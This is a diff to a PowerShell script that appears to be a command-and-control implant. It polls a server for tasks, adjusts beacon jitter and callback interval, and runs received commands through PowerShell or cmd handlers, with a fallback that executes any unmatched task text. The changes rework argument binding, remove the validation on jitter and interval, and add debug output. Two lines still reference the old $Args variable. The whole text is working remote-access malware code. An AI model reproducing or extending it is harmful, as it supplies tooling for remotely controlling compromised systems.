@@ -245,25 +245,30 @@ function Submit-TaskResult {
 # --- Task runtime and dispatch ---
 
 function Run-Set {
-  param([string[]]$Args)
-  if (-not $Args -or $Args.Count -lt 2) { 
+  # IMPORTANT: Do NOT use parameter name 'Args' to avoid clashing with automatic $args
+  param([string[]]$Argv)
+  Write-Host "[DEBUG task] Entered Run-Set command."
+  # Normalize in case a single string sneaks in or non-breaking spaces are used
+  if ($Argv -is [string]) { $Argv = @([string]$Argv) }
+  if ($Argv.Count -eq 1 -and ($Argv[0] -is [string])) {
+    $Argv = @([regex]::Split($Argv[0].Trim(), '[\s\u00A0]+') | Where-Object { $_ })
+  }
+  if (-not $Argv -or $Argv.Count -lt 2) {
     Write-Host "[task] Agrs less than 2"
-    Write-Host "[task] Agrgs: $Args"
+    Write-Host "[task] Agrgs: $Argv"
     return 'false' }
-  
-  $name = $Args[0].ToLower()
-  $value = $Args[1]
+
+  $name = ($Argv[0] | ForEach-Object { $_.ToString().ToLower() })
+  $value = [string]$Argv[1]
   Write-Host "[task] Arg[0] value is $($Args[0])"
    Write-Host "[task] Arg[1] value is $($Args[1])"
   switch ($name) {
-    'jitter' {
-      try { $v = [int]$value } catch { return 'false' }
-      if ($v -ge 0 -and $v -le 100) { $script:jitterPct = $v; return 'true' } else { return 'false' }
-    }
-    'interval' {
-      try { $iv = [int]$value } catch { return 'false' }
-      if ($iv -ge 1 -and $iv -le 86400) { $script:callbackInterval = $iv; return 'true' } else { return 'false' }
-    }
+    'jitter' { try { $script:jitterPct = [int]$value; return 'true' } catch { return 'false' } }
+    'jitter_value' { try { $script:jitterPct = [int]$value; return 'true' } catch { return 'false' } }
+    'jitter_pct'   { try { $script:jitterPct = [int]$value; return 'true' } catch { return 'false' } }
+    'interval' { try { $script:callbackInterval = [int]$value; return 'true' } catch { return 'false' } }
+    'callback' { try { $script:callbackInterval = [int]$value; return 'true' } catch { return 'false' } }
+    'callback_interval' { try { $script:callbackInterval = [int]$value; return 'true' } catch { return 'false' } }
     default { return 'false' }
   }
 }
@@ -287,25 +292,36 @@ function Run-Cmd {
 }
 
 function Register-DefaultHandlers {
-  Register-TaskHandler -Name 'set'        -Handler { param($a) Run-Set -Args $a }
-  Register-TaskHandler -Name 'powershell' -Handler { param($a) Run-PowerShell -Args $a }
-  Register-TaskHandler -Name 'ps'         -Handler { param($a) Run-PowerShell -Args $a }
-  Register-TaskHandler -Name 'cmd'        -Handler { param($a) Run-Cmd -Args $a }
+  Register-TaskHandler -Name 'set'        -Handler { param([string[]]$Argv) Run-Set -Args $Argv }
+  Register-TaskHandler -Name 'powershell' -Handler { param([string[]]$Argv) Run-PowerShell -Args $Argv }
+  Register-TaskHandler -Name 'ps'         -Handler { param([string[]]$Argv) Run-PowerShell -Args $Argv }
+  Register-TaskHandler -Name 'cmd'        -Handler { param([string[]]$Argv) Run-Cmd -Args $Argv }
 }
 
 function Run-Task {
   param([string]$TaskText)
   if (-not $TaskText) { return '' }
-  $parts = [regex]::Split($TaskText.Trim(), '\s+')
+  Write-Host "[DEBUG] Entered Run task TaskText is = $TaskText"
+  # Split on normal whitespace and non-breaking space (U+00A0) to be robust
+  $parts = @([regex]::Split($TaskText.Trim(), '[\s\u00A0]+') | Where-Object { $_ -and $_.Trim().Length -gt 0 })
   if ($parts.Length -eq 0) { return '' }
   $verb = $parts[0].ToLower()
-  $args = @()
-  if ($parts.Length -gt 1) { $args = $parts[1..($parts.Length-1)] }
+  Write-Host "[DEBUG] verb set to $verb"
+  Write-Host "[DEBUG] parts pos 1 = $($parts[1])"
+  # Avoid using the automatic $args variable name here; use $argList
+  [string[]]$argList = @()
+  if ($parts.Length -gt 1) { [string[]]$argList = $parts[1..($parts.Length-1)] }
 
   if ($script:TaskHandlers.ContainsKey($verb)) {
     $handler = $script:TaskHandlers[$verb]
-    # Invoke the handler and return its string result; do NOT execute the result as a command
-    try { return ($handler.Invoke($args)) } catch { return ("[handler error] {0}" -f $_.Exception.Message) }
+    Write-Host "[DEBUG] Handler set to be $handler"
+    Write-Host "[DEBUG] Arguments set to: $($argList -join ',')"
+    try {
+      # Bind explicitly by name to the handler's param([string[]]$Argv)
+      return (& $handler -Argv $argList)
+    } catch {
+      return ("[handler error] {0}" -f $_.Exception.Message)
+    }
   }
 
   # Fallback: run the full text via PowerShell
@@ -318,8 +334,10 @@ function Process-PollResponse {
   $taskCmd = $null
   if ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'Task') {
     $taskCmd = [string]$Poll.Data.Task
+    Write-Host "in 'if' statement Task Command is $taskCmd"
   } elseif ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'task') {
     $taskCmd = [string]$Poll.Data.task
+    Write-Host "in 'elseif' statment Task Command is $taskCmd"
   }
   if ($taskCmd -and $taskCmd.Trim().Length -gt 0) {
     Write-Host ("[task] Executing: {0}" -f $taskCmd)
